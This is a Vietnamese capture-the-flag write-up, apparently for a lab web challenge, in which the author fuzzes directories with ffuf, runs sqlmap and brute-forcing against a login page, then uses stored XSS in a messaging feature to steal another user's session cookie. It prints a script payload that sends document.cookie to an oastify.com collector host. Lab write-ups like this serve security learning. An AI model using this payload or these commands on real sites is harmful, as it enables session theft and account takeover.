![image](https://github.com/user-attachments/assets/bb94c1a8-bb89-4d1d-8ffc-aa9b16bf37fd)

Đây là giao diện của website:

![image](https://github.com/user-attachments/assets/e67b7a54-c888-4891-b6c7-bb84c4f2390f)

![image](https://github.com/user-attachments/assets/406d6599-9146-4ce4-a111-9c08cc35791e)

Thông tin về cái này quá ít ỏi

![image](https://github.com/user-attachments/assets/5eb4ca54-e8c2-4906-8119-b879599b88da)

Sau khi test chức năng đăng kí, tôi nghĩ là cái này để trang trí vì tôi nhập cái gì nó cũng bảo đã tồn tại 

![image](https://github.com/user-attachments/assets/9fd56335-da3a-454a-955f-abe967f9fdc4)

![image](https://github.com/user-attachments/assets/7f169727-7769-4406-85aa-8a065b6cfe40)

Thôi thì tôi thử FUZZ xem có gì không `ffuf -u http://94.237.54.190:37363/FUZZ -w Filenames_or_Directories_All.txt`<br>

Tiếp tục khai thác cái login trong khi đợi FUZZ bằng `sqlmap -r req.txt --level=5 --risk=3 --batch --dump-all`, tôi treo cái sqlmap ở đấy xem sqli không

![image](https://github.com/user-attachments/assets/808a2d50-d503-4487-8dd1-95eb05f0fcd6)

Trong lúc đợi treo sqlpmap thì tôi brute username và password 

![image](https://github.com/user-attachments/assets/51c73af1-c0ca-46b7-9836-859914a9d414)

Kết quả FUZZ thì tệ, thêm mỗi cái dashboard, mà vào thì redirect về lại login 

![image](https://github.com/user-attachments/assets/8207589a-fb4a-43e5-a8a6-73435c4a93c4)

Brute rồi cũng không ra, hơi thất vọng:((

![image](https://github.com/user-attachments/assets/73189dd7-6ca4-478d-87d5-1d7928ce3e3f)

Sau 1 khoảng thời gian tôi quay lại phần sign up và tôi đã đăng kí được, mấy lần trước không đăng kí được chắc là tôi up file php:))

![image](https://github.com/user-attachments/assets/be3d5707-b53f-4c6c-b9e0-39b898c0d993)

Sau khi đăng kí thì vào được cái dashboard

![image](https://github.com/user-attachments/assets/ec1f5f13-ef71-4e46-903a-f2259fe304df)

Sau khi nghịch cái match của web thì có cái nhắn tin và tôi nhận ra là dính xss

![image](https://github.com/user-attachments/assets/fce15a1e-46da-424e-9604-195ced32da0f)

Quay đi quay lại nó lọc luôn rồi

![image](https://github.com/user-attachments/assets/c26fcb30-fa8e-495d-803a-880895309dfa)

Tôi thử cái payload `<script>new Image().src = "https://izlxvmm0fef0u27ok5s4148s7jda10pp.oastify.com/?cookie=" + document.cookie;</script>` xem nó như nào:

![image](https://github.com/user-attachments/assets/a780fb7f-8ef5-4af7-a4d6-de4d3e628850)

Tôi lấy được cái cookie của Renata 

![image](https://github.com/user-attachments/assets/2b0e98cc-9b4a-4ae3-af08-c3554c4b1bc4)

![image](https://github.com/user-attachments/assets/a4f1bc2b-9039-4b38-b3dd-a63484cb58c4)

Tôi liền đổi cookie và truy cập được vào tài khoản của Renata và hiện ra flag

![image](https://github.com/user-attachments/assets/aa011646-f857-473a-81d5-c27075cf35c2)








